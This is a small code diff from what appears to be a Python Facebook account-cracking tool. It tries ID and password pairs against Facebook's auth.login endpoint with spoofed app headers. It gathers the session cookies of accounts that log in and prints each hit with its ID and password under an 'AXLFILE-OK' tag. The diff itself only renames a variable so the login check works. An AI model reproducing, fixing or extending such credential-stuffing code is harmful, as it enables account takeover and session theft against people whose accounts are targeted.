@@ -216,7 +216,7 @@ def m1(ids,names,passlist):
                         headers = {'Authorization': f'OAuth {accessToken}', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
                         url = 'https://api.facebook.com/method/auth.login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        YUJI = requests.post(url,data=data,headers=headers).json()
+                        AXL = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in AXL:
                                         coki = ";".join(i["name"]+"="+i["value"] for i in AXL["session_cookies"])
                                         print('\r\r\033[1;32m[AXLFILE-OK] '+ids+' | ' + pas + ' | ' + zari(ids) + '\033[1;97m')
